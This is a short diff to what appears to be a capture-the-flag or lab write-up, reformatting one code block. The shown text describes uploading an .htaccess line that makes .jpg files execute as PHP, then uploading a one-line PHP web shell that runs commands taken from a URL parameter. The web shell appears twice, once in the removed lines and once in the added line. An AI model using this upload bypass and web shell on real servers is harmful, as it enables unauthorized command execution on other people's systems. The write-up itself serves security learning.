@@ -14,11 +14,7 @@ First we'll upload an .htaccess that will allow us to upload jpg files but inter
 The .htaccess file contains `AddType application/x-httpd-php .jpg`.
 
 We can then upload an image with the following code giving us a web shell:
-`
-<?php
-if(isset($_GET["cmd"])) 
-        system($_GET["cmd"]);
-?>`
+`<?php if(isset($_GET["cmd"])) system($_GET["cmd"]); ?>`
 
 ![i2](17.jpg)
 
